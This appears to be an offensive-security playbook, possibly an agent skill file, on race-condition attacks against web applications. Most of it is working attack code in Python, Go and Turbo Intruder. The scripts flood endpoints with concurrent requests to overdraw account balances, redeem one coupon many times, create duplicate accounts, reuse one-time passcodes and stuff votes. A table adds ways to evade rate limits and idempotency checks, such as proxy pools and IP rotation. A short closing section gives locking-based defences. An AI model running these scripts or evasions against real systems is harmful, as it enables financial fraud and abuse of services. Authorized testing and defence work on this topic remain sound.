# Race Conditions (Concurrency Attacks)

## Trigger

Load when you see:

- Financial operations: withdraw, transfer, payment, refund
- Limited-use operations: coupon redemption, gift card usage, promo code
- Single-use tokens: OTP, verification codes, nonce-based operations
- Limited-quantity operations: flash sales, limited editions, ticket booking
- Unique constraint operations: username registration, email verification
- State transition operations: order cancellation, shipment dispatch, refund processing
- "Check-then-act" patterns: read balance, check > 0, then deduct

## Attack Surface

- Non-atomic "SELECT then UPDATE" database operations
- Missing database unique constraints or application-level unique enforcement
- Rate limiting based on request count rather than operation attempt count
- Single-use codes/tokens consumed after use without locking
- Idempotency keys missing or improperly implemented
- File upload with separate upload-phase and verification-phase

## Decision Tree

1. Identify a check-then-act operation (e.g., read balance, check if >= 100, deduct 100)
2. Send N concurrent requests (50-100) targeting the same resource
3. Compare results: if N successful operations happen with only 1 unit of resource, race confirmed
4. Escalate: coupon double-spend, balance overdraft, gift card multi-redeem, state machine skip

## Techniques

### Balance Overdraft (Python threading)

```python
import threading, requests

def withdraw():
    requests.post("http://target/api/withdraw",
                  json={"amount": 100},
                  headers={"Authorization": "Bearer X"})

# Account has 100 balance, send 50 concurrent withdrawal requests
threads = [threading.Thread(target=withdraw) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# Check balance -- likely negative or multiple successful withdrawals
r = requests.get("http://target/api/balance", headers={"Authorization": "Bearer X"})
print(r.json())  # e.g., balance: -400, 5 successful withdrawals of $100 each
```

### Coupon Double-Use

```python
def use_coupon():
    requests.post("http://target/api/order/create",
                  json={"productId": "X", "couponCode": "SAVE50"},
                  headers={"Authorization": "Bearer X"})

threads = [threading.Thread(target=use_coupon) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
# Server: 1 coupon should be usable once, but concurrent requests created 5 discounted orders
```

### Unique Constraint Bypass (Registration Race)

```python
def register():
    requests.post("http://target/api/register",
                  json={"email": "victim@test.com", "username": "admin", "password": "x"})

threads = [threading.Thread(target=register) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
# If no unique constraint + check-then-create -> multiple accounts with same email/username
```

### Single-Packet Attack (Last-Byte Sync)

Use Turbo Intruder to synchronize requests at the TCP level by queuing all requests
behind a gate, then opening the gate to fire them simultaneously:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=100,
                            engine=Engine.BURP)
    for i in range(50):
        engine.queue(target.req, gate='r1')
    engine.openGate('r1')  # All 50 requests fire at once

def handleResponse(req, interesting):
    table.add(req)
```

### Rate Limit Race

```python
import aiohttp, asyncio

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100):
            tasks.append(session.post("http://target/api/vote",
                                      json={"vote": "A"}))
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.status == 200)
        print(f"Successful votes: {success}")

asyncio.run(race())
```

### Token/OTP Single-Use Race

```python
def verify_otp(otp):
    requests.post("http://target/api/verify-otp",
                  json={"code": otp, "session": "SESSION_ID"})

# Send 50 concurrent requests with the same OTP
# If the server marks the OTP as used AFTER processing, all 50 may pass
threads = [threading.Thread(target=verify_otp, args=("123456",)) for _ in range(50)]
[t.start() for t in threads]
```

### Go-routine Parallel Race

```go
package main

import (
    "net/http"
    "sync"
    "bytes"
    "fmt"
)

func main() {
    var wg sync.WaitGroup
    url := "http://target/api/withdraw"
    jsonBody := []byte(`{"amount":100}`)
    
    for i := 0; i < 50; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            http.Post(url, "application/json", bytes.NewBuffer(jsonBody))
        }()
    }
    wg.Wait()
    fmt.Println("50 concurrent withdrawal requests sent")
}
```

## Bypass

| Block | Bypass |
|-------|--------|
| Single-connection rate limit | Multiple connections / HTTP/2 multiplexing |
| Same-IP rate limit | Proxy pool / IP rotation |
| Idempotency-Key | Remove key / use different keys for same operation |
| Database unique constraint | Case variation: `Hunter@x` vs `hunter@x` |
| Single-use token | Use the token concurrently BEFORE the server marks it used |

## Verification

- Before: check balance/coupon count (e.g., balance=100, coupon_count=1)
- Attack: run the race script
- After: check balance/coupon count again
- If balance < 0 or coupon_count > 1 with successful operations, race is confirmed

## Pitfalls

- Race conditions are probabilistic -- run 5-10 rounds and report success rate.
- 50 concurrent requests is usually sufficient. 1000+ is considered DoS.
- HTTP/1.1 pipelining is harder to exploit than HTTP/2 multiplexing.
- Database transactions alone do NOT prevent race conditions -- SELECT+UPDATE inside a
  transaction still allows concurrent reads of the same pre-update value.
- Proper defense requires pessimistic locking (`SELECT FOR UPDATE`), atomic increment
  operations, or unique constraints -- not just transactions.
- State machine races (e.g., a cancelled order being shipped) require precise timing
  between the cancellation and shipping API calls.
